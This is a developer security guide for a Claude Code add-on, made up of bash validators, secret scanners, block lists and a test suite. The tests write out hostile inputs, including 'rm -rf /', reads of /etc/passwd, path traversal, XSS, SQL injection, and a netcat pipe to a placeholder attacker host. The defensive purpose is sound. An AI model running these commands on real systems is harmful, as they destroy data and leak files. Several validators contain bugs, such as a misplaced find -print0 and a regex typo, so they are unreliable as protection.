# Security Guidelines

Comprehensive security guidelines and best practices for developing secure Claude Code Enhancer commands, templates, and workflows.

## Security Philosophy

### Core Security Principles

1. **Zero Trust**: Never trust user input or external data
2. **Defense in Depth**: Multiple layers of security controls
3. **Principle of Least Privilege**: Minimal permissions required
4. **Fail Securely**: Secure defaults and safe failure modes
5. **Security by Design**: Security considerations from the start

### Security Model

```bash
# Security validation pipeline
validate_security() {
    local operation="$1"
    local context="$2"
    
    # Layer 1: Input validation
    if ! validate_input_security "$operation" "$context"; then
        return 1
    fi
    
    # Layer 2: Permission validation
    if ! validate_permissions "$operation" "$context"; then
        return 1
    fi
    
    # Layer 3: Environment validation
    if ! validate_environment_security "$operation"; then
        return 1
    fi
    
    # Layer 4: Resource validation
    if ! validate_resource_access "$operation" "$context"; then
        return 1
    fi
    
    return 0
}
```

## Input Validation and Sanitization

### User Input Validation

```bash
# Comprehensive input validation framework
validate_user_input() {
    local input="$1"
    local input_type="$2"
    local max_length="${3:-1024}"
    
    # Basic length validation
    if [[ ${#input} -gt $max_length ]]; then
        security_log "CRITICAL" "Input length exceeded maximum: ${#input} > $max_length"
        return 1
    fi
    
    # Null byte injection prevention
    if [[ "$input" == *$'\x00'* ]]; then
        security_log "CRITICAL" "Null byte injection attempt detected"
        return 1
    fi
    
    # Type-specific validation
    case "$input_type" in
        "file_path")
            validate_file_path_security "$input"
            ;;
        "command")
            validate_command_security "$input"
            ;;
        "url")
            validate_url_security "$input"
            ;;
        "json")
            validate_json_security "$input"
            ;;
        "shell_arg")
            validate_shell_argument_security "$input"
            ;;
        "template_param")
            validate_template_parameter_security "$input"
            ;;
        *)
            security_log "ERROR" "Unknown input type: $input_type"
            return 1
            ;;
    esac
}

# File path security validation
validate_file_path_security() {
    local file_path="$1"
    
    # Prevent path traversal attacks
    if [[ "$file_path" =~ \.\./|\.\.\\ ]]; then
        security_log "CRITICAL" "Path traversal attempt: $file_path"
        return 1
    fi
    
    # Prevent access to sensitive directories
    local forbidden_patterns=(
        '/etc/*'
        '/usr/bin/*'
        '/usr/sbin/*'
        '/bin/*'
        '/sbin/*'
        '/root/*'
        '/home/*/\.*'
        '*/\.ssh/*'
        '*/\.gnupg/*'
    )
    
    for pattern in "${forbidden_patterns[@]}"; do
        if [[ "$file_path" == $pattern ]]; then
            security_log "CRITICAL" "Access to forbidden path: $file_path"
            return 1
        fi
    done
    
    # Ensure path is within project directory
    local canonical_path=$(realpath "$file_path" 2>/dev/null || echo "$file_path")
    local project_root=$(realpath "." 2>/dev/null || pwd)
    
    if [[ ! "$canonical_path" == "$project_root"* ]]; then
        security_log "CRITICAL" "Path outside project root: $canonical_path"
        return 1
    fi
    
    # Validate path length
    if [[ ${#file_path} -gt 4096 ]]; then
        security_log "WARNING" "Exceptionally long file path: ${#file_path} characters"
        return 1
    fi
    
    return 0
}

# Command security validation
validate_command_security() {
    local command="$1"
    
    # Check for command injection patterns
    local dangerous_patterns=(
        ';.*'
        '&&.*'
        '\|\|.*'
        '`.*`'
        '\$\(.*\)'
        '>\s*/dev/'
        '<\s*/dev/'
        '\|.*'
        '&.*'
    )
    
    for pattern in "${dangerous_patterns[@]}"; do
        if [[ "$command" =~ $pattern ]]; then
            security_log "CRITICAL" "Command injection pattern detected: $pattern in $command"
            return 1
        fi
    done
    
    # Whitelist allowed commands
    local command_name=$(echo "$command" | awk '{print $1}')
    if ! is_command_whitelisted "$command_name"; then
        security_log "CRITICAL" "Non-whitelisted command attempted: $command_name"
        return 1
    fi
    
    # Validate command arguments
    local args=$(echo "$command" | cut -d' ' -f2-)
    if [[ -n "$args" ]]; then
        validate_command_arguments "$args"
    fi
    
    return 0
}

# Command whitelist
is_command_whitelisted() {
    local command="$1"
    
    local allowed_commands=(
        # Core utilities
        'ls' 'cat' 'echo' 'mkdir' 'touch' 'cp' 'mv' 'rm'
        # Git commands
        'git'
        # Package managers
        'npm' 'pip' 'cargo' 'go' 'maven' 'gradle'
        # Development tools
        'node' 'python' 'python3' 'java' 'rustc'
        # Text processing
        'grep' 'sed' 'awk' 'sort' 'uniq' 'wc'
        # File operations
        'find' 'xargs' 'tar' 'gzip' 'zip'
        # Testing tools
        'jest' 'pytest' 'cargo' 'mvn'
        # Claude commands
        'claude'
    )
    
    for allowed in "${allowed_commands[@]}"; do
        if [[ "$command" == "$allowed" ]]; then
            return 0
        fi
    done
    
    return 1
}

# Shell argument validation
validate_shell_argument_security() {
    local arg="$1"
    
    # Check for shell metacharacters
    local dangerous_chars='[;&|`$(){}*?<>]'
    if [[ "$arg" =~ $dangerous_chars ]]; then
        security_log "WARNING" "Shell metacharacters in argument: $arg"
        
        # Require explicit escaping
        if [[ "$CLAUDE_ALLOW_SHELL_METACHARACTERS" != "1" ]]; then
            return 1
        fi
    fi
    
    # Check for environment variable injection
    if [[ "$arg" =~ \$[A-Za-z_][A-Za-z0-9_]* ]]; then
        security_log "WARNING" "Environment variable reference in argument: $arg"
        
        # Validate environment variable access
        local var_name=$(echo "$arg" | grep -o '\$[A-Za-z_][A-Za-z0-9_]*' | sed 's/\$//')
        if ! is_env_var_safe "$var_name"; then
            security_log "CRITICAL" "Access to restricted environment variable: $var_name"
            return 1
        fi
    fi
    
    return 0
}

# Environment variable safety check
is_env_var_safe() {
    local var_name="$1"
    
    local restricted_vars=(
        'PATH'
        'LD_LIBRARY_PATH'
        'SHELL'
        'USER'
        'HOME'
        'SUDO_USER'
        'SSH_*'
        'GPG_*'
    )
    
    for restricted in "${restricted_vars[@]}"; do
        if [[ "$var_name" == $restricted ]]; then
            return 1
        fi
    done
    
    return 0
}
```

### Template Parameter Security

```bash
# Template parameter validation
validate_template_parameter_security() {
    local param_value="$1"
    local param_name="$2"
    
    # Check parameter length
    if [[ ${#param_value} -gt 1024 ]]; then
        security_log "WARNING" "Large template parameter: $param_name (${#param_value} chars)"
    fi
    
    # Validate parameter content based on type
    case "$param_name" in
        "PROJECT_NAME")
            validate_project_name_security "$param_value"
            ;;
        "FILE_PATH"|"*_PATH")
            validate_file_path_security "$param_value"
            ;;
        "COMMAND"|"*_COMMAND")
            validate_command_security "$param_value"
            ;;
        "URL"|"*_URL")
            validate_url_security "$param_value"
            ;;
        *)
            validate_generic_parameter_security "$param_value"
            ;;
    esac
}

# Generic parameter validation
validate_generic_parameter_security() {
    local param_value="$1"
    
    # Check for script injection patterns
    local script_patterns=(
        '<script.*>'
        'javascript:'
        'data:.*base64'
        'eval\s*\('
        'exec\s*\('
    )
    
    for pattern in "${script_patterns[@]}"; do
        if [[ "$param_value" =~ $pattern ]]; then
            security_log "CRITICAL" "Script injection pattern in parameter: $pattern"
            return 1
        fi
    done
    
    # Check for SQL injection patterns
    local sql_patterns=(
        'UNION\s+SELECT'
        'DROP\s+TABLE'
        'DELETE\s+FROM'
        'INSERT\s+INTO'
        'UPDATE\s+.*SET'
        '--.*'
        '/\*.*\*/'
    )
    
    for pattern in "${sql_patterns[@]}"; do
        if [[ "$param_value" =~ $pattern ]]; then
            security_log "WARNING" "SQL-like pattern in parameter: $pattern"
        fi
    done
    
    return 0
}
```

## Permission and Access Control

### File System Security

```bash
# File system access control
validate_file_system_access() {
    local operation="$1"
    local target_path="$2"
    local user_context="${3:-$(whoami)}"
    
    case "$operation" in
        "read")
            validate_read_access "$target_path" "$user_context"
            ;;
        "write")
            validate_write_access "$target_path" "$user_context"
            ;;
        "execute")
            validate_execute_access "$target_path" "$user_context"
            ;;
        "delete")
            validate_delete_access "$target_path" "$user_context"
            ;;
        *)
            security_log "ERROR" "Unknown file operation: $operation"
            return 1
            ;;
    esac
}

# Read access validation
validate_read_access() {
    local target_path="$1"
    local user_context="$2"
    
    # Check if file/directory exists
    if [[ ! -e "$target_path" ]]; then
        security_log "WARNING" "Attempt to read non-existent path: $target_path"
        return 1
    fi
    
    # Check read permissions
    if [[ ! -r "$target_path" ]]; then
        security_log "ERROR" "No read permission for: $target_path"
        return 1
    fi
    
    # Check for sensitive files
    if is_sensitive_file "$target_path"; then
        security_log "CRITICAL" "Attempt to read sensitive file: $target_path"
        return 1
    fi
    
    # Log access attempt
    security_log "INFO" "Read access granted: $target_path (user: $user_context)"
    
    return 0
}

# Write access validation
validate_write_access() {
    local target_path="$1"
    local user_context="$2"
    
    # Check if target exists
    if [[ -e "$target_path" ]]; then
        # Check write permissions for existing file
        if [[ ! -w "$target_path" ]]; then
            security_log "ERROR" "No write permission for existing file: $target_path"
            return 1
        fi
        
        # Check if it's a critical system file
        if is_critical_system_file "$target_path"; then
            security_log "CRITICAL" "Attempt to write to critical system file: $target_path"
            return 1
        fi
    else
        # Check parent directory permissions
        local parent_dir=$(dirname "$target_path")
        if [[ ! -w "$parent_dir" ]]; then
            security_log "ERROR" "No write permission for parent directory: $parent_dir"
            return 1
        fi
    fi
    
    # Validate write operation safety
    if ! is_safe_write_operation "$target_path"; then
        security_log "CRITICAL" "Unsafe write operation detected: $target_path"
        return 1
    fi
    
    # Log write access
    security_log "INFO" "Write access granted: $target_path (user: $user_context)"
    
    return 0
}

# Sensitive file detection
is_sensitive_file() {
    local file_path="$1"
    
    local sensitive_patterns=(
        '*/\.ssh/*'
        '*/\.gnupg/*'
        '*/\.aws/*'
        '*/.env*'
        '*/id_rsa*'
        '*/id_dsa*'
        '*/id_ecdsa*'
        '*/id_ed25519*'
        '*/shadow'
        '*/passwd'
        '*/sudoers*'
        '*/hosts'
        '*/.htpasswd'
        '*/private.key'
        '*/secret*'
        '*/token*'
        '*/credential*'
    )
    
    for pattern in "${sensitive_patterns[@]}"; do
        if [[ "$file_path" == $pattern ]]; then
            return 0
        fi
    done
    
    return 1
}

# Critical system file detection
is_critical_system_file() {
    local file_path="$1"
    
    local critical_patterns=(
        '/boot/*'
        '/etc/fstab'
        '/etc/passwd'
        '/etc/shadow'
        '/etc/sudoers*'
        '/etc/ssh/*'
        '/usr/bin/*'
        '/usr/sbin/*'
        '/bin/*'
        '/sbin/*'
        '/lib/*'
        '/lib64/*'
    )
    
    for pattern in "${critical_patterns[@]}"; do
        if [[ "$file_path" == $pattern ]]; then
            return 0
        fi
    done
    
    return 1
}
```

### Process Security

```bash
# Process execution security
execute_process_secure() {
    local command="$1"
    shift
    local args=("$@")
    
    # Validate command before execution
    if ! validate_command_security "$command ${args[*]}"; then
        return 1
    fi
    
    # Set secure environment
    setup_secure_environment
    
    # Execute with resource limits
    execute_with_limits "$command" "${args[@]}"
}

# Secure environment setup
setup_secure_environment() {
    # Clear potentially dangerous environment variables
    unset LD_PRELOAD
    unset LD_LIBRARY_PATH
    unset DYLD_INSERT_LIBRARIES
    unset DYLD_LIBRARY_PATH
    
    # Set secure PATH
    export PATH="/usr/local/bin:/usr/bin:/bin"
    
    # Set resource limits
    ulimit -f 1024000    # 1GB file size limit
    ulimit -t 3600       # 1 hour CPU time limit
    ulimit -v 2097152    # 2GB virtual memory limit
    ulimit -n 1024       # 1024 open files limit
    
    # Set secure umask
    umask 022
}

# Execute with resource limits
execute_with_limits() {
    local command="$1"
    shift
    local args=("$@")
    
    # Create temporary directory with secure permissions
    local temp_dir=$(mktemp -d)
    chmod 700 "$temp_dir"
    
    # Execute in controlled environment
    (
        cd "$temp_dir"
        timeout 3600 "$command" "${args[@]}"
    )
    local exit_code=$?
    
    # Cleanup
    rm -rf "$temp_dir"
    
    return $exit_code
}
```

## Secrets Management

### Secret Detection and Protection

```bash
# Secret scanning system
scan_for_secrets() {
    local target_path="$1"
    local scan_type="${2:-comprehensive}"
    
    case "$scan_type" in
        "quick")
            quick_secret_scan "$target_path"
            ;;
        "comprehensive")
            comprehensive_secret_scan "$target_path"
            ;;
        "deep")
            deep_secret_scan "$target_path"
            ;;
    esac
}

# Comprehensive secret scanning
comprehensive_secret_scan() {
    local target_path="$1"
    local findings=()
    
    echo "Scanning for secrets in: $target_path"
    
    # API keys
    local api_key_patterns=(
        'api[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9]{20,}'
        'apikey["\s]*[:=]["\s]*[a-zA-Z0-9]{20,}'
        'api[_-]?secret["\s]*[:=]["\s]*[a-zA-Z0-9]{20,}'
    )
    
    # Passwords
    local password_patterns=(
        'password["\s]*[:=]["\s]*[^\s"]{8,}'
        'passwd["\s]*[:=]["\s]*[^\s"]{8,}'
        'pwd["\s]*[:=]["\s]*[^\s"]{8,}'
    )
    
    # Tokens
    local token_patterns=(
        'token["\s]*[:=]["\s]*[a-zA-Z0-9]{20,}'
        'access[_-]?token["\s]*[:=]["\s]*[a-zA-Z0-9]{20,}'
        'auth[_-]?token["\s]*[:=]["\s]*[a-zA-Z0-9]{20,}'
        'bearer["\s]+[a-zA-Z0-9]{20,}'
    )
    
    # Private keys
    local key_patterns=(
        '-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----'
        '-----BEGIN\s+OPENSSH\s+PRIVATE\s+KEY-----'
        '-----BEGIN\s+DSA\s+PRIVATE\s+KEY-----'
        '-----BEGIN\s+EC\s+PRIVATE\s+KEY-----'
    )
    
    # Database credentials
    local db_patterns=(
        'mysql://[^:]+:[^@]+@'
        'postgresql://[^:]+:[^@]+@'
        'mongodb://[^:]+:[^@]+@'
        'redis://[^:]+:[^@]+@'
    )
    
    # Combine all patterns
    local all_patterns=("${api_key_patterns[@]}" "${password_patterns[@]}" "${token_patterns[@]}" "${key_patterns[@]}" "${db_patterns[@]}")
    
    # Scan files
    while IFS= read -r -d '' file; do
        for pattern in "${all_patterns[@]}"; do
            if grep -qP "$pattern" "$file" 2>/dev/null; then
                local finding="POTENTIAL_SECRET:$file:$(grep -nP "$pattern" "$file" | head -1 | cut -d: -f1)"
                findings+=("$finding")
                security_log "CRITICAL" "Potential secret found in $file"
            fi
        done
    done < <(find "$target_path" -type f -name "*.md" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name "*.env*" -o -name "*.conf" -o -name "*.config" -print0)
    
    # Report findings
    if [[ ${#findings[@]} -gt 0 ]]; then
        echo "⚠️  SECRET SCAN RESULTS ⚠️"
        printf '%s\n' "${findings[@]}"
        return 1
    else
        echo "✅ No secrets detected"
        return 0
    fi
}

# Secret masking for logs
mask_secrets() {
    local input="$1"
    
    # Mask common secret patterns
    local masked="$input"
    
    # Mask API keys
    masked=$(echo "$masked" | sed -E 's/([aA][pP][iI][_-]?[kK][eY]["\s]*[:=]["\s]*)[a-zA-Z0-9]{20,}/\1***MASKED***/g')
    
    # Mask passwords
    masked=$(echo "$masked" | sed -E 's/([pP][aA][sS][sS][wW][oO][rR][dD]["\s]*[:=]["\s]*)[^\s"]{8,}/\1***MASKED***/g')
    
    # Mask tokens
    masked=$(echo "$masked" | sed -E 's/([tT][oO][kK][eE][nN]["\s]*[:=]["\s]*)[a-zA-Z0-9]{20,}/\1***MASKED***/g')
    
    # Mask private keys
    masked=$(echo "$masked" | sed -E 's/(-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----).*?(-----END\s+(RSA\s+)?PRIVATE\s+KEY-----)/\1***MASKED***\3/gs')
    
    echo "$masked"
}
```

### Environment Variable Security

```bash
# Secure environment variable handling
setup_secure_env_vars() {
    # Define allowed environment variables
    local allowed_env_vars=(
        'CLAUDE_*'
        'PATH'
        'LANG'
        'LC_*'
        'TZ'
        'USER'
        'HOME'
        'PWD'
        'SHELL'
        'TERM'
    )
    
    # Create clean environment
    local clean_env=()
    
    # Copy only allowed variables
    while IFS='=' read -r var_name var_value; do
        local allowed=false
        for pattern in "${allowed_env_vars[@]}"; do
            if [[ "$var_name" == $pattern ]]; then
                allowed=true
                break
            fi
        done
        
        if [[ "$allowed" == "true" ]]; then
            clean_env+=("$var_name=$var_value")
        fi
    done < <(env)
    
    # Set up clean environment
    env -i "${clean_env[@]}" bash
}

# Environment variable validation
validate_env_var() {
    local var_name="$1"
    local var_value="$2"
    
    # Check for secret patterns in environment variables
    if contains_secret_pattern "$var_value"; then
        security_log "CRITICAL" "Secret detected in environment variable: $var_name"
        return 1
    fi
    
    # Validate variable name
    if [[ ! "$var_name" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
        security_log "WARNING" "Invalid environment variable name: $var_name"
        return 1
    fi
    
    # Check variable length
    if [[ ${#var_value} -gt 4096 ]]; then
        security_log "WARNING" "Exceptionally long environment variable: $var_name (${#var_value} chars)"
    fi
    
    return 0
}
```

## Network Security

### Network Communication Security

```bash
# Secure network operations
execute_network_operation() {
    local operation="$1"
    local target="$2"
    shift 2
    local args=("$@")
    
    # Validate network target
    if ! validate_network_target "$target"; then
        security_log "CRITICAL" "Invalid network target: $target"
        return 1
    fi
    
    # Set up secure network environment
    setup_secure_network_env
    
    case "$operation" in
        "download")
            secure_download "$target" "${args[@]}"
            ;;
        "upload")
            secure_upload "$target" "${args[@]}"
            ;;
        "api_call")
            secure_api_call "$target" "${args[@]}"
            ;;
        *)
            security_log "ERROR" "Unknown network operation: $operation"
            return 1
            ;;
    esac
}

# Network target validation
validate_network_target() {
    local target="$1"
    
    # Block private/internal networks
    local blocked_patterns=(
        '127\.'
        '10\.'
        '172\.(1[6-9]|2[0-9]|3[0-1])\.'
        '192\.168\.'
        'localhost'
        '0\.0\.0\.0'
        '::1'
        'fc00::'
        'fe80::'
    )
    
    for pattern in "${blocked_patterns[@]}"; do
        if [[ "$target" =~ $pattern ]]; then
            security_log "CRITICAL" "Blocked network target: $target (pattern: $pattern)"
            return 1
        fi
    done
    
    # Validate URL format
    if [[ "$target" =~ ^https?:// ]]; then
        # Extract hostname
        local hostname=$(echo "$target" | sed -E 's|^https?://([^/]+).*|\1|')
        
        # Additional hostname validation
        if ! validate_hostname_security "$hostname"; then
            return 1
        fi
    fi
    
    return 0
}

# Secure download implementation
secure_download() {
    local url="$1"
    local output_file="$2"
    local max_size="${3:-10485760}"  # 10MB default
    
    # Validate output file path
    if ! validate_file_path_security "$output_file"; then
        return 1
    fi
    
    # Use curl with security settings
    curl --max-filesize "$max_size" \
         --max-time 300 \
         --location \
         --fail \
         --silent \
         --show-error \
         --user-agent "Claude-Code-Enhancer/1.0" \
         --proto '=https' \
         --tlsv1.2 \
         --cert-status \
         --output "$output_file" \
         "$url"
    
    local exit_code=$?
    
    if [[ $exit_code -eq 0 ]]; then
        # Verify downloaded file
        verify_downloaded_file "$output_file"
        security_log "INFO" "Secure download completed: $url -> $output_file"
    else
        security_log "ERROR" "Secure download failed: $url (exit code: $exit_code)"
        rm -f "$output_file"  # Clean up on failure
    fi
    
    return $exit_code
}
```

### TLS/SSL Security

```bash
# TLS/SSL configuration
configure_tls_security() {
    # Set minimum TLS version
    export CURL_CA_BUNDLE="/etc/ssl/certs/ca-certificates.crt"
    export SSL_CERT_FILE="/etc/ssl/certs/ca-certificates.crt"
    
    # Configure TLS settings
    local tls_config=(
        "--tlsv1.2"
        "--cert-status"
        "--ssl-reqd"
    )
    
    export CLAUDE_TLS_CONFIG="${tls_config[*]}"
}

# Certificate validation
validate_certificate() {
    local hostname="$1"
    local port="${2:-443}"
    
    # Check certificate validity
    local cert_info=$(openssl s_client -connect "$hostname:$port" -servername "$hostname" </dev/null 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
    
    if [[ -z "$cert_info" ]]; then
        security_log "ERROR" "Unable to retrieve certificate for $hostname:$port"
        return 1
    fi
    
    # Check certificate expiration
    local expiry_date=$(echo "$cert_info" | grep "Not After" | sed 's/.*Not After : //')
    local expiry_timestamp=$(date -d "$expiry_date" +%s 2>/dev/null || echo 0)
    local current_timestamp=$(date +%s)
    
    if [[ $expiry_timestamp -le $current_timestamp ]]; then
        security_log "CRITICAL" "Certificate expired for $hostname"
        return 1
    fi
    
    # Check if certificate expires within 30 days
    local thirty_days=$((30 * 24 * 3600))
    if [[ $((expiry_timestamp - current_timestamp)) -lt $thirty_days ]]; then
        security_log "WARNING" "Certificate for $hostname expires within 30 days"
    fi
    
    security_log "INFO" "Certificate validation passed for $hostname"
    return 0
}
```

## Security Logging and Monitoring

### Security Event Logging

```bash
# Security logging framework
security_log() {
    local level="$1"
    local message="$2"
    local context="${3:-}"
    
    local timestamp=$(date -Iseconds)
    local log_file=".claude/logs/security.log"
    local session_id="${CLAUDE_SESSION_ID:-unknown}"
    
    # Ensure log directory exists
    mkdir -p ".claude/logs"
    
    # Mask any secrets in the message
    local safe_message=$(mask_secrets "$message")
    
    # Format log entry
    local log_entry="[$timestamp] [$level] [$session_id] $safe_message"
    if [[ -n "$context" ]]; then
        log_entry="$log_entry [Context: $context]"
    fi
    
    # Write to log file
    echo "$log_entry" >> "$log_file"
    
    # Also output to stderr for critical/error events
    case "$level" in
        "CRITICAL"|"ERROR")
            echo "$log_entry" >&2
            ;;
    esac
    
    # Trigger alerts for critical events
    if [[ "$level" == "CRITICAL" ]]; then
        trigger_security_alert "$safe_message" "$context"
    fi
}

# Security alert system
trigger_security_alert() {
    local message="$1"
    local context="${2:-}"
    
    local alert_file=".claude/alerts/security_alert_$(date +%Y%m%d_%H%M%S).json"
    mkdir -p ".claude/alerts"
    
    # Create alert record
    cat > "$alert_file" << EOF
{
    "timestamp": "$(date -Iseconds)",
    "level": "CRITICAL",
    "message": "$(echo "$message" | jq -Rs .)",
    "context": "$(echo "$context" | jq -Rs .)",
    "session_id": "${CLAUDE_SESSION_ID:-unknown}",
    "user": "$(whoami)",
    "working_directory": "$(pwd)",
    "environment": {
        "shell": "$SHELL",
        "term": "$TERM",
        "ssh_connection": "${SSH_CONNECTION:-}"
    }
}
EOF
    
    # Send alert notification
    send_security_notification "$alert_file"
}

# Security monitoring
start_security_monitoring() {
    local monitoring_interval="${1:-60}"
    
    echo "Starting security monitoring (interval: ${monitoring_interval}s)"
    
    while true; do
        # Monitor for suspicious activities
        monitor_file_changes
        monitor_process_activities
        monitor_network_connections
        
        # Check for security violations
        check_security_violations
        
        # Analyze security logs
        analyze_security_logs
        
        sleep "$monitoring_interval"
    done
}

# File change monitoring
monitor_file_changes() {
    local watch_dirs=("." ".claude")
    local sensitive_extensions=("*.key" "*.pem" "*.p12" "*.env*")
    
    for dir in "${watch_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            # Check for changes to sensitive files
            for ext in "${sensitive_extensions[@]}"; do
                local changed_files=($(find "$dir" -name "$ext" -newer ".claude/security_check_timestamp" 2>/dev/null))
                
                for file in "${changed_files[@]}"; do
                    security_log "WARNING" "Sensitive file modified: $file"
                done
            done
        fi
    done
    
    # Update timestamp
    touch ".claude/security_check_timestamp"
}

# Security violation detection
check_security_violations() {
    local violation_count=0
    
    # Check for failed authentication attempts
    local failed_auths=$(grep "CRITICAL" ".claude/logs/security.log" 2>/dev/null | tail -n 100 | wc -l)
    if [[ $failed_auths -gt 10 ]]; then
        security_log "CRITICAL" "High number of security violations detected: $failed_auths in recent logs"
        ((violation_count++))
    fi
    
    # Check for suspicious file access patterns
    local suspicious_access=$(grep "Path outside project root" ".claude/logs/security.log" 2>/dev/null | tail -n 100 | wc -l)
    if [[ $suspicious_access -gt 5 ]]; then
        security_log "CRITICAL" "Suspicious file access patterns detected: $suspicious_access attempts"
        ((violation_count++))
    fi
    
    # Check for command injection attempts
    local injection_attempts=$(grep "Command injection pattern" ".claude/logs/security.log" 2>/dev/null | tail -n 100 | wc -l)
    if [[ $injection_attempts -gt 0 ]]; then
        security_log "CRITICAL" "Command injection attempts detected: $injection_attempts"
        ((violation_count++))
    fi
    
    return $violation_count
}
```

## Security Testing and Validation

### Security Test Framework

```bash
# Security test suite
run_security_tests() {
    echo "Running security test suite..."
    
    local test_results=()
    
    # Input validation tests
    test_results+=($(test_input_validation))
    
    # Path traversal tests
    test_results+=($(test_path_traversal_protection))
    
    # Command injection tests
    test_results+=($(test_command_injection_protection))
    
    # File permission tests
    test_results+=($(test_file_permission_validation))
    
    # Secret detection tests
    test_results+=($(test_secret_detection))
    
    # Network security tests
    test_results+=($(test_network_security))
    
    # Generate security test report
    generate_security_test_report "${test_results[@]}"
}

# Input validation testing
test_input_validation() {
    local test_name="input_validation"
    local test_results=()
    
    echo "Testing input validation..."
    
    # Test malicious inputs
    local malicious_inputs=(
        "../../../etc/passwd"
        "; rm -rf /"
        "\$(cat /etc/passwd)"
        "<script>alert('xss')</script>"
        "' OR '1'='1"
        "\x00\x01\x02"
    )
    
    for input in "${malicious_inputs[@]}"; do
        if validate_user_input "$input" "generic" 1024 >/dev/null 2>&1; then
            test_results+=("FAIL:$test_name:Malicious input accepted: $input")
        else
            test_results+=("PASS:$test_name:Malicious input rejected: $input")
        fi
    done
    
    printf '%s\n' "${test_results[@]}"
}

# Path traversal protection testing
test_path_traversal_protection() {
    local test_name="path_traversal"
    local test_results=()
    
    echo "Testing path traversal protection..."
    
    # Test path traversal attempts
    local traversal_paths=(
        "../../../etc/passwd"
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"
        "....//....//....//etc//passwd"
        "/etc/passwd"
        "~/.ssh/id_rsa"
    )
    
    for path in "${traversal_paths[@]}"; do
        if validate_file_path_security "$path" >/dev/null 2>&1; then
            test_results+=("FAIL:$test_name:Path traversal not blocked: $path")
        else
            test_results+=("PASS:$test_name:Path traversal blocked: $path")
        fi
    done
    
    printf '%s\n' "${test_results[@]}"
}

# Command injection protection testing
test_command_injection_protection() {
    local test_name="command_injection"
    local test_results=()
    
    echo "Testing command injection protection..."
    
    # Test command injection attempts
    local injection_commands=(
        "ls; cat /etc/passwd"
        "ls && rm -rf /"
        "ls | nc attacker.com 1234"
        "ls \$(cat /etc/passwd)"
        "ls \`id\`"
    )
    
    for cmd in "${injection_commands[@]}"; do
        if validate_command_security "$cmd" >/dev/null 2>&1; then
            test_results+=("FAIL:$test_name:Command injection not blocked: $cmd")
        else
            test_results+=("PASS:$test_name:Command injection blocked: $cmd")
        fi
    done
    
    printf '%s\n' "${test_results[@]}"
}

# Secret detection testing
test_secret_detection() {
    local test_name="secret_detection"
    local test_results=()
    
    echo "Testing secret detection..."
    
    # Create test files with secrets
    local test_dir=$(mktemp -d)
    
    # Test secret patterns
    cat > "$test_dir/config.json" << 'EOF'
{
    "api_key": "sk-1234567890abcdef1234567890abcdef12345678",
    "database_url": "postgresql://user:password123@localhost/db",
    "jwt_secret": "super_secret_jwt_key_12345"
}
EOF
    
    cat > "$test_dir/private.key" << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1234567890abcdef...
-----END RSA PRIVATE KEY-----
EOF
    
    # Run secret scan
    if scan_for_secrets "$test_dir" "quick" >/dev/null 2>&1; then
        test_results+=("FAIL:$test_name:Secrets not detected in test files")
    else
        test_results+=("PASS:$test_name:Secrets correctly detected in test files")
    fi
    
    # Cleanup
    rm -rf "$test_dir"
    
    printf '%s\n' "${test_results[@]}"
}

# Generate security test report
generate_security_test_report() {
    local test_results=("$@")
    local report_file=".claude/reports/security_test_report_$(date +%Y%m%d_%H%M%S).json"
    
    mkdir -p ".claude/reports"
    
    local passed=0
    local failed=0
    local test_details=()
    
    # Analyze results
    for result in "${test_results[@]}"; do
        local status=$(echo "$result" | cut -d: -f1)
        local test_name=$(echo "$result" | cut -d: -f2)
        local description=$(echo "$result" | cut -d: -f3-)
        
        if [[ "$status" == "PASS" ]]; then
            ((passed++))
        else
            ((failed++))
        fi
        
        test_details+=("{\"status\": \"$status\", \"test\": \"$test_name\", \"description\": \"$description\"}")
    done
    
    # Generate JSON report
    cat > "$report_file" << EOF
{
    "timestamp": "$(date -Iseconds)",
    "summary": {
        "total_tests": $((passed + failed)),
        "passed": $passed,
        "failed": $failed,
        "success_rate": $(echo "scale=2; $passed * 100 / ($passed + $failed)" | bc)
    },
    "test_results": [
        $(IFS=','; echo "${test_details[*]}")
    ]
}
EOF
    
    echo "Security test report generated: $report_file"
    
    if [[ $failed -gt 0 ]]; then
        echo "⚠️  Security tests failed: $failed/$((passed + failed))"
        return 1
    else
        echo "✅ All security tests passed: $passed/$((passed + failed))"
        return 0
    fi
}
```

## Security Best Practices

### Secure Development Guidelines

1. **Input Validation**
   - Validate all user inputs before processing
   - Use whitelisting over blacklisting
   - Sanitize data for output contexts
   - Implement length and format checks

2. **Access Control**
   - Follow principle of least privilege
   - Validate file system permissions
   - Restrict command execution
   - Monitor resource access

3. **Secret Management**
   - Never commit secrets to version control
   - Use environment variables for secrets
   - Implement secret scanning
   - Mask secrets in logs

4. **Network Security**
   - Validate all network targets
   - Use HTTPS for all communications
   - Implement certificate validation
   - Block private/internal networks

5. **Error Handling**
   - Fail securely with safe defaults
   - Log security events appropriately
   - Don't expose sensitive information in errors
   - Implement proper error recovery

### Security Checklist

#### Pre-Development
- [ ] Security requirements identified
- [ ] Threat model created
- [ ] Security architecture reviewed
- [ ] Security standards documented

#### During Development
- [ ] Input validation implemented
- [ ] Access controls enforced
- [ ] Secrets properly managed
- [ ] Security logging enabled

#### Pre-Deployment
- [ ] Security tests passing
- [ ] Vulnerability scan completed
- [ ] Code review includes security review
- [ ] Security documentation updated

#### Post-Deployment
- [ ] Security monitoring enabled
- [ ] Incident response plan ready
- [ ] Regular security assessments scheduled
- [ ] Security patches process defined

---

**Next**: [Release Process](./release-process.md) - Release management and deployment

**See Also**:
- [Quality Standards](./quality-standards.md) - Code quality and review processes
- [Testing Guidelines](./testing-guidelines.md) - Testing strategies and requirements
- [Debugging Guide](./debugging-guide.md) - Troubleshooting and debugging techniques